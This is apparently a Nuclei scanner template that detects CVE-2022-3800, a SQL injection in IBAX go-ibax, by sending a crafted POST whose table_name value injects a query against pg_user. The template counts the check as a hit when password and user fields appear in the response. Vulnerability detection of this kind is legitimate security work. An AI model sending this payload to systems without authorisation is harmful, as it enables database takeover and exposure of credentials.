id: go-ibax-sqli

info:
  name: IBAX go-ibax - SQL Injection
  author: JC175
  severity: high
  description: |
    IBAX go-ibax contains a SQL injection vulnerability via the table_name parameter. An attacker can spoof identity, tamper with or view existing data, destroy the data or make it otherwise unavailable, and become administrators of the database server. This issue affects versions starting from commits on Jul 18, 2020 until Dec 2, 2022.
  reference:
    - https://github.com/IBAX-io/go-ibax/issues/2061
    - https://nvd.nist.gov/vuln/detail/CVE-2022-3800
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-89
  metadata:
    verified: true
  tags: cve,cve2022,IBAX,go-ibax,sqli

requests:
  - raw:
      - |
        POST /api/v2/open/rowsInfo HTTP/2
        Host: {{Hostname}}
        User-Agent: {{header}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 71
        order=1&table_name=pg_user"%3b+select+pg_sleep(1)%3b+--"&limit=1&page=1
    matchers-condition: and
    matchers:

      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "Content-Type: application/json"

      - type: word
        part: body
        words:
          - '"passwd":'
          - '"usename":'
          - '"usesysid":'
